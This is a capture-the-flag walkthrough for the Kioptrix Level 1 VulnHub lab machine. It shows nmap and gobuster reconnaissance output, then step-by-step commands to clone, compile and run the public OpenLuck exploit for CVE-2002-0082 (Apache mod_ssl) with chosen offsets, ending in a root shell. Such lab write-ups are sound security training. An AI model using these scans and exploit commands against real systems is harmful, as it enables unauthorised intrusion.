# Kioptrix Level 1



This Kioptrix VM Image are easy challenges. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges.

[Download Link](https://www.vulnhub.com/entry/kioptrix-level-1-1,22/)

![Info](https://github.com/satharv/Oscp_Prep/blob/main/Writeups/vulnhub/Kioptrix_level_1/images/1.png)
![Description](https://github.com/satharv/Oscp_Prep/blob/main/Writeups/vulnhub/Kioptrix_level_1/images/2.png)

## Initial Recon
### Nmap Scan
Finding the ip address of machine
```
nmap -sn 192.168.29.1/24
```
![IP image](https://github.com/satharv/Oscp_Prep/blob/main/Writeups/vulnhub/Kioptrix_level_1/images/3.png)

After knowing the ip address let's run a full port scan to see which ports are open.

```
# nmap -v -p- 192.168.29.17 -oN nmap_initial_scan.txt

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-03 16:48 EDT
Initiating ARP Ping Scan at 16:48
Scanning 192.168.29.17 [1 port]
Completed ARP Ping Scan at 16:48, 0.03s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 16:48
Completed Parallel DNS resolution of 1 host. at 16:48, 0.00s elapsed
Initiating SYN Stealth Scan at 16:48
Scanning 192.168.29.17 [65535 ports]
Discovered open port 443/tcp on 192.168.29.17
Discovered open port 139/tcp on 192.168.29.17
Discovered open port 80/tcp on 192.168.29.17
Discovered open port 22/tcp on 192.168.29.17
Discovered open port 111/tcp on 192.168.29.17
Discovered open port 32768/tcp on 192.168.29.17
Completed SYN Stealth Scan at 16:48, 13.15s elapsed (65535 total ports)
Nmap scan report for 192.168.29.17
Host is up (0.00027s latency).
Not shown: 65529 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
139/tcp   open  netbios-ssn
443/tcp   open  https
32768/tcp open  filenet-tms
MAC Address: 08:00:27:7B:60:42 (Oracle VirtualBox virtual NIC)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 13.30 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)

-v = verbose mode
-p- = all port scan 
-oN = output

We have  22,80,111,139,443,32768 ports open on this machine. Now we will go for the version detection of services running.

# nmap -v -p 22,80,111,139,443,32768 -sC -sV -A 192.168.29.17 -oN nmap_services_scan.txt

PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 2.9p2 (protocol 1.99)
| ssh-hostkey: 
|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)
|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)
|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)
|_sshv1: Server supports SSHv1
80/tcp    open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-title: Test Page for the Apache Web Server on Red Hat Linux
| http-methods: 
|   Supported Methods: GET HEAD OPTIONS TRACE
|_  Potentially risky methods: TRACE
111/tcp   open  rpcbind     2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1          32768/tcp   status
|_  100024  1          32768/udp   status
139/tcp   open  netbios-ssn Samba smbd (workgroup: 5MYGROUP)
443/tcp   open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Issuer: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: md5WithRSAEncryption
| Not valid before: 2009-09-26T09:32:06
| Not valid after:  2010-09-26T09:32:06
| MD5:   78ce:5293:4723:e7fe:c28d:74ab:42d7:02f1
|_SHA-1: 9c42:91c3:bed2:a95b:983d:10ac:f766:ecb9:8766:1d33
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-title: 400 Bad Request
|_ssl-date: 2024-09-04T00:52:05+00:00; +3h59m59s from scanner time.
| http-methods: 
|_  Supported Methods: GET HEAD POST
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|_    SSL2_DES_192_EDE3_CBC_WITH_MD5
32768/tcp open  status      1 (RPC #100024)
MAC Address: 08:00:27:7B:60:42 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 2.4.X
OS CPE: cpe:/o:linux:linux_kernel:2.4
OS details: Linux 2.4.9 - 2.4.18 (likely embedded)
Uptime guess: 0.018 days (since Tue Sep  3 16:26:01 2024)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=194 (Good luck!)
IP ID Sequence Generation: All zeros

Host script results:
| nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   KIOPTRIX<00>         Flags: <unique><active>
|   KIOPTRIX<03>         Flags: <unique><active>
|   KIOPTRIX<20>         Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   MYGROUP<00>          Flags: <group><active>
|   MYGROUP<1d>          Flags: <unique><active>
|_  MYGROUP<1e>          Flags: <group><active>
|_clock-skew: 3h59m58s
|_smb2-time: Protocol negotiation failed (SMB2)

TRACEROUTE
HOP RTT     ADDRESS
1   0.47 ms 192.168.29.17

-sC = script scan
-sV = open ports service/version information
-A = enable os detection

We have 
22/tcp    open  ssh         OpenSSH 2.9p2 (protocol 1.99)
80/tcp    open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
111/tcp   open  rpcbind     2 (RPC #100000)
139/tcp   open  netbios-ssn Samba smbd (workgroup: 5MYGROUP)
443/tcp   open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
32768/tcp open  status      1 (RPC #100024)
```
## Enumeration
Let's start the enumeration from port no 80 which is running apache httpd 1.3.20

```
@ 80/tcp    open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
```

On hitting ip address on browser we have a test page  of apache on this

![Loading Page](https://github.com/satharv/Oscp_Prep/blob/main/Writeups/vulnhub/Kioptrix_level_1/images/4.png)

Running gobuster to check if there is any directory or file that can reveal some information to proceed further.

```
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.29.17 -t 50 -b 503,404
```

![Gobuster image](https://github.com/satharv/Oscp_Prep/blob/main/Writeups/vulnhub/Kioptrix_level_1/images/5.png)

Nothing interesting is found in gobuster scan.
On searching web I found that the apache and mod_ssl version are vulnerable to [CVE-2002-0082](https://nvd.nist.gov/vuln/detail/CVE-2002-0082).

![exploit image](https://github.com/satharv/Oscp_Prep/blob/main/Writeups/vulnhub/Kioptrix_level_1/images/6.png)

## Exploiting

Download the exploit from [here](https://github.com/heltonWernik/OpenLuck?tab=readme-ov-file) and run.

![github page image](https://github.com/satharv/Oscp_Prep/blob/main/Writeups/vulnhub/Kioptrix_level_1/images/7.png)

```
git clone https://github.com/heltonWernik/OpenLuck.git
```

![kali  term1](https://github.com/satharv/Oscp_Prep/blob/main/Writeups/vulnhub/Kioptrix_level_1/images/8.png)

Install the requirements mentioned. 

```
apt-get install libssl-dev
```

![kali term2](https://github.com/satharv/Oscp_Prep/blob/main/Writeups/vulnhub/Kioptrix_level_1/images/9.png)

Compile the file using 
```
gcc -o OpenFuck OpenFuck.c -lcrypto
Ignore the errors
```

Give permissions.
```
chmod +x OpenFuck
```

Run the exploit
```
./OpenFuck
It gives us the list of some offsets with the name of os and apache version.
```

![kali term3](https://github.com/satharv/Oscp_Prep/blob/main/Writeups/vulnhub/Kioptrix_level_1/images/10.png)

Check the os details and apache version in the list and use that offset.
OS = Redhat 
Apache Version = 1.3.20

Use grep command to filter the output and see what we need.

![kali term4](https://github.com/satharv/Oscp_Prep/blob/main/Writeups/vulnhub/Kioptrix_level_1/images/11.png)

We can try offset 0x6a and 0x6b which matches our versions and os.
```
./OpenFuck 0x6a 192.168.29.17 443 -c 40
```

![kali term5](https://github.com/satharv/Oscp_Prep/blob/main/Writeups/vulnhub/Kioptrix_level_1/images/12.png)

This spawned the shell but didn't last long and exited.
```
./OpenFuck 0x6b 192.168.29.17 443 -c 40
```

![kali term6](https://github.com/satharv/Oscp_Prep/blob/main/Writeups/vulnhub/Kioptrix_level_1/images/13.png)

This gave us the shell.

![kali term7](https://github.com/satharv/Oscp_Prep/blob/main/Writeups/vulnhub/Kioptrix_level_1/images/14.png)

We directly got the root shell.










